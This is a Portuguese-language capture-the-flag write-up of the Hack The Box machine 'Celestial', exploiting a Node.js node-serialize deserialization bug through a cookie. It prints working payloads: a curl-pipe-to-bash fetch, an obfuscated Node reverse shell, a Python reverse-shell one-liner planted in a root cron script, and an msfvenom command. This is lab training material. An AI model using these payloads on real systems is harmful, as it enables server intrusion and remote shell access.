---
title: "Hack The Box - Celestial"
tags: [Linux,Medium,BurpSuite,Deserealization,Pspy,Web]
categories: HackTheBox OSWE
---

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-celestial/C_inicial.png)

Link: <https://www.hackthebox.eu/home/machines/profile/130>

# Enumeração

## Primeiro passo é rodar o nmap contra a máquina, para verificar quais portas estão abertas e quais serviços estão sendo disponibilizados pelas portas.

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-celestial/C_nmap.png)

### Explicação de cada parâmetro do Nmap

> -sC --> Rodar alguns scripts padrão em cada porta

> -sV --> Levantar qual serviço está rodando na porta

> -Pn --> Já considera o host ativo

### Verificamos que temos 1 porta aberta no servidor

> Porta 3000 - Node JS

## Enumeração da porta 3000

Abrimos o browser no endereço e encontramos a seguinte página web

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-celestial/C_web.png)


## BurpSuite

Bom, temos uma página estranha, não sabemos o que fazer... vamos mandar a requisição pro `BurpSuite` pra tentar fazer algo com ela, se podemos mudar, sei lá.

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-celestial/C_burp.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-celestial/C_burp1.png)

Mandamos pro `Repeater`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-celestial/C_burp2.png)

Verificamos que esse profiler ta com muito cara de ser um Base64

Desencodamos ele

> eyJ1c2VybmFtZSI6IkR1bW15IiwiY291bnRyeSI6IklkayBQcm9iYWJseSBTb21ld2hlcmUgRHVtYiIsImNpdHkiOiJMYW1ldG93biIsIm51bSI6IjIifQ%3D%3D

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-celestial/C_base.png)

Esse final dele não é base64, está em URLEncode e significa ==, mas não influencia no resultado do base64

> %3D%3D

Será que não podemos alterar as mensagens? Uma vez que visualizando ele tem o número 2, tem o dummy... vamos tentar trocar e colocar no *Profile*

Para isso vamos direto no `Decoder`

Copiamos o código do Profile, vamos em *Decode As BASE64* (Lembrar de alterar o final lá por ==)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-celestial/C_decoder.png)

Agora modificamos como queremos o Payload e clicamos em *Encode As BASE64*

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-celestial/C_decode1.png)

Agora copiamos o código gerado e jogamos no profile da requisição

> eyJ1c2VybmFtZSI6IkhhY2tlciIsImNvdW50cnkiOiJJZGsgUHJvYmFibHkgU29tZXdoZXJlIER1bWIiLCJjaXR5IjoiTGFtZXRvd24iLCJudW0iOiI2NjY2In0=

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-celestial/C_decode2.png)

Opa! Conseguimos manipular isso!

Isso se da por um módulo chamado *node-js*

## Node-Js

Bom, após uma longa pesquisa sobre o que seria essa vulnerabilidade descobrimos como ela funciona, vou tentar explicar aqui

Perguntando pra quem sabe, sempre temos a resposta correta... Google

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-celestial/C_google.png)

Encontramos duas páginas de referenciais para entender

> https://www.exploit-db.com/docs/english/41289-exploiting-node.js-deserialization-bug-for-remote-code-execution.pdf

> https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/

```
De acordo com o artigo, os dados que enviamos como valor de cookie (aquele profile) foram passados ​​para a função unserialize(), que desserializa o código de formato serializado (node-js) e o executa de acordo. Como o Node.js e muitas outras linguagens dependem da serialização dos objetos, o principal problema está na análise desses dados, independentemente de conterem ou não algum código malicioso. Aproveitando isso, podemos gerar um payload e, por isso, tentar executar algo que pode nos ajudar em uma exploração mais aprofundada. Uma vez criado o payload, podemos enviar a bagaça como um valor de cookie, que passa a ser desserializado e com isso vai executar nosso payload.
```

Então, mãos à obra!

# Exploração

Iremos realizar de dois modos essa exploração, sempre procurando ser o mais explicativo possível. A primeira maneira será totalmente manual, instalando o node-js na máquina, criando o payload na unha. A segunda iremos utilizar um GitHub que contém um script que automatiza.

## Criando payload na mão

Vou reproduzir o que está descrito nos blogs linkados acima!

Bom, a primeira coisa a se fazer para explorar essa falha não mão á a instalação do `node-serealize`

> npm install node-serealize

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-celestial/C_instala.png)

Bom, o payload a ser criado eu copiei do blog

```
var y = {
    ​rce : function(){​require('child_process').exec('ls /', function(error,stdout, stderr) { console.log(stdout) });​
    },
}
var serialize = require('node-serialize');
console.log("Serialized: \n" + serialize.serialize(y));
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-celestial/C_log.png)

Executamos o `node` nele, para realizar a serealização

> {"rce":"_$$ND_FUNC$$_function(){\n \trequire('child_process').exec('ls /', function(error,stdout, stderr) { console.log(stdout) });\n\t}"}

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-celestial/C_node_log.png)

O que vamos fazer agora é ir dentro dos módulos do node é procurar por pelo q essa função faz (ND_FUNC)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-celestial/C-grep.png)

Encontramos esse módulo, verificamos dentro dessa função oq FUNCFLAG faz ele passa para a função `eval(x)`, é assim que ele faz o Remote Code Execution

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-celestial/C_grep.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-celestial/C_grep1.png)

Alteramos o payload, com o intuito de ficar com os mesmos dados que a máquina pede

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-celestial/C_alt.png)

Encodamos em Base64

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-celestial/C_alt1.png)

Enviamos e vimos que não deu erro

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-celestial/C_alt2.png)

Ta, não deu erro, mas será que executou o código? Depois de testar várias vezes vi que não executou, então fiz algumas alterações no código

Vamos alterar direto no `Decoder` do `BurpSuite`

> {"username":"_$$ND_FUNC$$_require('child_process').exec('ping -c1 10.10.16.119', function(error,stdout,stderr) { console.log(stdout) })","country":"Idk Probably Somewhere Dumb","city":"Lametown","num":"2"}

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-celestial/C_ping.png)

Ligamos o `tcpdump`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-celestial/C_ping1.png)

Enviamos a requisição

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-celestial/C_ping2.png)

Recebemos o ping!

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-celestial/C_ping3.png)

Temos RCE!!!

Agora pegamos um Reverse Shell antes de fazer as outras duas possibilidades de exploração

Esse será o que vai ser executado

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-celestial/C_s.png)

Alteramos no BurpSuite

```
{"username":"_$$ND_FUNC$$_require('child_process').exec('curl 10.10.16.119/shell.sh | bash', function(error,stdout,stderr) { console.log(stdout) })","country":"Idk Probably Somewhere Dumb","city":"Lametown","num":"2"}
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-celestial/C_s1.png)

Ligamos o Python Web Server e o nc na porta 443

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-celestial/C_s2.png)

Enviamos a requisição

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-celestial/C_s3.png)

Recebemos a shell!

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-celestial/C_s4.png)

Shoow!

## Através do GitHub

Agora vamos testar com um código do github que automatiza o processo

> https://github.com/ajinabraham/Node.Js-Security-Course/blob/master/nodejsshell.py

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-celestial/C-git.png)

Passamos ele para nossa máquina

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-celestial/C_git.png)

Executamos

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-celestial/C_git2.png)

Agora com o arquivo original do `payload.js`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-celestial/C_git1.png)

Alteramos ele com o Payload criado pelo script

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-celestial/C_git3.png)

Serealizamos ele com o `node`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-celestial/C_git4.png)

Jogamos no BurpSuite para codificar em Base64

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-celestial/C_git5.png)

Executamos e ganhamos a shell

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-celestial/C_git6.png)

Não deu de primeira, fiquei quebrando cabeça um bom tempo... o que eu percebi é que tive que adaptar um pouco o que foi gerado pelo `node`, o final ficou desse modo:

```
{"username":"_$$ND_FUNC$$_eval(String.fromCharCode(10,118,97,114,32,110,101,116,32,61,32,114,101,113,117,105,114,101,40,39,110,101,116,39,41,59,10,118,97,114,32,115,112,97,119,110,32,61,32,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,115,112,97,119,110,59,10,72,79,83,84,61,34,49,48,46,49,48,46,49,54,46,49,49,57,34,59,10,80,79,82,84,61,34,52,52,51,34,59,10,84,73,77,69,79,85,84,61,34,53,48,48,48,34,59,10,105,102,32,40,116,121,112,101,111,102,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,61,61,32,39,117,110,100,101,102,105,110,101,100,39,41,32,123,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,32,102,117,110,99,116,105,111,110,40,105,116,41,32,123,32,114,101,116,117,114,110,32,116,104,105,115,46,105,110,100,101,120,79,102,40,105,116,41,32,33,61,32,45,49,59,32,125,59,32,125,10,102,117,110,99,116,105,111,110,32,99,40,72,79,83,84,44,80,79,82,84,41,32,123,10,32,32,32,32,118,97,114,32,99,108,105,101,110,116,32,61,32,110,101,119,32,110,101,116,46,83,111,99,107,101,116,40,41,59,10,32,32,32,32,99,108,105,101,110,116,46,99,111,110,110,101,99,116,40,80,79,82,84,44,32,72,79,83,84,44,32,102,117,110,99,116,105,111,110,40,41,32,123,10,32,32,32,32,32,32,32,32,118,97,114,32,115,104,32,61,32,115,112,97,119,110,40,39,47,98,105,110,47,115,104,39,44,91,93,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,119,114,105,116,101,40,34,67,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,112,105,112,101,40,115,104,46,115,116,100,105,110,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,111,117,116,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,101,114,114,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,111,110,40,39,101,120,105,116,39,44,102,117,110,99,116,105,111,110,40,99,111,100,101,44,115,105,103,110,97,108,41,123,10,32,32,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,101,110,100,40,34,68,105,115,99,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,125,41,59,10,32,32,32,32,125,41,59,10,32,32,32,32,99,108,105,101,110,116,46,111,110,40,39,101,114,114,111,114,39,44,32,102,117,110,99,116,105,111,110,40,101,41,32,123,10,32,32,32,32,32,32,32,32,115,101,116,84,105,109,101,111,117,116,40,99,40,72,79,83,84,44,80,79,82,84,41,44,32,84,73,77,69,79,85,84,41,59,10,32,32,32,32,125,41,59,10,125,10,99,40,72,79,83,84,44,80,79,82,84,41,59,10))","country":"Brasil","city":"Brasil","num":"666"}
```

O que estava antes era assim:

```
{"username":"_$$ND_FUNC$$_function(){ eval(String.fromCharCode(10,118,97,114,32,110,101,116,32,61,32,114,101,113,117,105,114,101,40,39,110,101,116,39,41,59,10,118,97,114,32,115,112,97,119,110,32,61,32,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,115,112,97,119,110,59,10,72,79,83,84,61,34,49,48,46,49,48,46,49,54,46,49,49,57,34,59,10,80,79,82,84,61,34,52,52,51,34,59,10,84,73,77,69,79,85,84,61,34,53,48,48,48,34,59,10,105,102,32,40,116,121,112,101,111,102,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,61,61,32,39,117,110,100,101,102,105,110,101,100,39,41,32,123,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,32,102,117,110,99,116,105,111,110,40,105,116,41,32,123,32,114,101,116,117,114,110,32,116,104,105,115,46,105,110,100,101,120,79,102,40,105,116,41,32,33,61,32,45,49,59,32,125,59,32,125,10,102,117,110,99,116,105,111,110,32,99,40,72,79,83,84,44,80,79,82,84,41,32,123,10,32,32,32,32,118,97,114,32,99,108,105,101,110,116,32,61,32,110,101,119,32,110,101,116,46,83,111,99,107,101,116,40,41,59,10,32,32,32,32,99,108,105,101,110,116,46,99,111,110,110,101,99,116,40,80,79,82,84,44,32,72,79,83,84,44,32,102,117,110,99,116,105,111,110,40,41,32,123,10,32,32,32,32,32,32,32,32,118,97,114,32,115,104,32,61,32,115,112,97,119,110,40,39,47,98,105,110,47,115,104,39,44,91,93,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,119,114,105,116,101,40,34,67,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,112,105,112,101,40,115,104,46,115,116,100,105,110,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,111,117,116,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,101,114,114,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,111,110,40,39,101,120,105,116,39,44,102,117,110,99,116,105,111,110,40,99,111,100,101,44,115,105,103,110,97,108,41,123,10,32,32,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,101,110,100,40,34,68,105,115,99,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,125,41,59,10,32,32,32,32,125,41,59,10,32,32,32,32,99,108,105,101,110,116,46,111,110,40,39,101,114,114,111,114,39,44,32,102,117,110,99,116,105,111,110,40,101,41,32,123,10,32,32,32,32,32,32,32,32,115,101,116,84,105,109,101,111,117,116,40,99,40,72,79,83,84,44,80,79,82,84,41,44,32,84,73,77,69,79,85,84,41,59,10,32,32,32,32,125,41,59,10,125,10,99,40,72,79,83,84,44,80,79,82,84,41,59,10))}","country":"Brasil","city":"Brasil","num":"666"}
```

Se percebermos tive que tirar o *function()* ai deu certo, o porque não consegui entender.

# Escalação de privilégio

Bom, uma vez esclarecido a questão de como explorar a vulnerabilidade, vamos iniciar a fase de escalação de privilégio

Com o script de enumeração não vamos encontrar nada de útil, entã rodamos o PSPY na máquina, pra verificar se tem alguma cronjob rodando como root

> https://github.com/DominicBreuker/pspy

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-celestial/C_pspy.png)

Passamos pra máquina

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-celestial/C_pspy1.png)

Executamos e verificamos! Tem um script em /Document/script.py que é executado

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-celestial/C_pspy2.png)

Verificamos do que se trata e suas permissões

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-celestial/C_priv.png)

Podemos escrever nele! Agora ficou fácil, injetamos um shell python

```
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.16.119",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-celestial/C_priv1.png)

Ligamos o nc na máquina e esperamos virar root!

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-celestial/C_priv2.png)

## Pegamos flag de user e root

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-celestial/C_root.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-celestial/C_user.png)

# Obs Msfvenom

Também daria pra fazer através do msfvenom, ele suporta criação da payloads nodejs, mas eu não consegui reproduzir com sucesso. Então, fica pra próxima! Se alguém conseguir, por favor entre em contato comigo.

> msfvenom -p nodejs/shell_reverse_tcp LHOST=10.10.16.119 LPORT=443